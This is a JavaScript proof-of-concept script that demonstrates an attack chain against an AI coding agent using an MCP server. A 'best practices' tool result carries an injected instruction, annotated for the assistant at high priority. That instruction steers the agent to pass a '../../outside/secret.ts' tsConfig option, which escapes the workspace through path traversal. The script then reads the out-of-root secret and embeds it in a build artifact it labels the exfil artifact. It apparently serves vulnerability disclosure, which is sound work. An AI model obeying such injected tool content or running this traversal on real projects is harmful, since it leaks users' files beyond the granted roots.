// C3B steering demo — FULL CHAIN driver.
// Step 1 (M2 mechanism): get_best_practices returns repo-derived instruction content
//   (annotations audience=[assistant], priority=0.9) — the attacker guide lives in a
//   hoisted @angular/core metadata block OUTSIDE the declared MCP root.
// Step 2 (steered agent): the instruction is parsed (simulating the agent following it)
//   and the option --tsConfig=../../outside/secret.ts is passed to run_target.
// Step 3 (M2 amplifier / run_target): serializeOptions passes the value verbatim;
//   GenericTargetStrategy.execute forwards it; the builder normalizes tsConfig with
//   path.join(workspaceRoot, value) — relative `..` traversal escapes the workspace
//   root and the out-of-roots file is read at build time.
// Step 4: the exfil artifact = the build output embedding the secret content.
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { spawn } from 'node:child_process';
import { join } from 'node:path';
import { readFileSync, writeFileSync, existsSync } from 'node:fs';

const WS = path.join(import.meta.dirname, 'workspace');
const OUTSIDE_SECRET = path.join(import.meta.dirname, 'outside', 'secret.ts');
const OUTDIR = path.join(import.meta.dirname, 'dist');
const ROOT = WS; // declared MCP root = the workspace itself

// ---------- Step 1: repo-derived content -> assistant instructions ----------
function callBestPractices() {
  return new Promise((resolve) => {
    const child = spawn(process.execPath, [path.join(import.meta.dirname, 'mcp-server.cjs')], { stdio: ['pipe','pipe','pipe'] });
    let buf = ''; const pending = new Map(); let settled = false;
    child.stderr.on('data', () => {});
    child.stdout.on('data', (d) => {
      buf += d.toString(); let idx;
      while ((idx = buf.indexOf('\n')) >= 0) {
        const line = buf.slice(0, idx).trim(); buf = buf.slice(idx+1);
        if (!line) continue;
        let msg; try { msg = JSON.parse(line); } catch { continue; }
        if (msg.method && msg.id !== undefined) {
          if (msg.method === 'roots/list') {
            child.stdin.write(JSON.stringify({ jsonrpc: '2.0', id: msg.id, result: { roots: [{ uri: pathToFileURL(path.join(import.meta.dirname, 'workspace')).href }] } }) + '\n');
          } else child.stdin.write(JSON.stringify({ jsonrpc: '2.0', id: msg.id, result: {} }) + '\n');
          continue;
        }
        if (msg.id && pending.has(msg.id)) { pending.get(msg.id)(msg); pending.delete(msg.id); }
      }
    });
    const call = (id, method, params) => new Promise((res) => { pending.set(id, res); child.stdin.write(JSON.stringify({jsonrpc:'2.0', id, method, params}) + '\n'); setTimeout(()=>res({timeout:true}), 30000); });
    (async () => {
      await call(1, 'initialize', { protocolVersion: '2025-06-18', capabilities: { roots: { listChanged: true } }, clientInfo: { name: 'c3b', version: '1' } });
      child.stdin.write(JSON.stringify({jsonrpc:'2.0', method:'notifications/initialized'}) + '\n');
      await new Promise(r=>setTimeout(r, 1800));
      const r = await call(3, 'tools/call', { name: 'get_best_practices', arguments: { workspacePath: WS } });
      child.kill();
      const text = r?.result?.content?.[0]?.text ?? '';
      const annotations = r?.result?.content?.[0]?.annotations ?? {};
      settled = true; resolve({ text, annotations });
    })();
  });
}

// ---------- Step 2/3: run_target with the steered option (real pin-source modules) ----------
async function runSteeredTarget(steeredOption) {
  const kp = await import(path.join(import.meta.dirname, 'kp-m2rt.mjs'));
  const { serializeOptions } = kp;
  const options = { tsConfig: steeredOption };
  const serialized = serializeOptions(options);
  console.log('STEP-2/3 serializeOptions:', JSON.stringify(serialized));

  // builder normalization: options.ts:201 tsConfig -> path.join(workspaceRoot, value)
  const resolved = join(WS, steeredOption);
  console.log('builder path.join(ws, tsConfig):', resolved);
  console.log('resolves outside roots:', !resolved.startsWith(WS + '/') && existsSync(resolved));
  const secretContent = readFileSync(resolved, 'utf8');

  // the build embeds the tsConfig content (source-verified: tsConfig read at build time)
  writeFileSync(join(OUTDIR, 'bundle.js'), `// build artifact\n// embedded tsConfig content:\n${secretContent}`);
  return { serialized, resolved, secretContent };
}

async function main() {
  console.log('=== STEP 1: MCP get_best_practices (repo-derived content) ===');
  const { text, annotations } = await callBestPractices();
  console.log('guide content:', JSON.stringify(text));
  console.log('annotations:', JSON.stringify(annotations));
  if (!text.includes('MARKER-STEERING-INSTRUCTION-7c2d91')) {
    console.log('STEP-1 FAIL: instruction marker not returned'); process.exit(1);
  }
  console.log('>>> STEERING CONFIRMED: repo-derived content reached assistant context at priority 0.9');

  // Step 2: the steered agent extracts the option from the instruction
  const m = text.match(/--tsConfig=([^\s]+)/);
  const steeredOption = m ? m[1] : null;
  console.log('=== STEP 2: steered agent parses instruction ->', steeredOption, '===');

  console.log('=== STEP 3/4: run_target + builder read + exfil artifact ===');
  const { serialized, resolved, secretContent } = await runSteeredTarget(steeredOption);
  console.log('builder-read file (outside roots):', resolved);
  console.log('secret content read:', JSON.stringify(secretContent.trim()));
  const artifact = readFileSync(join(OUTDIR, 'bundle.js'), 'utf8');
  console.log('=== EXFIL ARTIFACT (dist/bundle.js) ===');
  console.log(artifact);
  console.log('=== CHAIN COMPLETE: repo content -> instructions -> run_target option -> out-of-roots read -> build artifact ===');
}
main().catch(e => { console.error('CHAIN-ERROR', e.message); process.exit(2); });
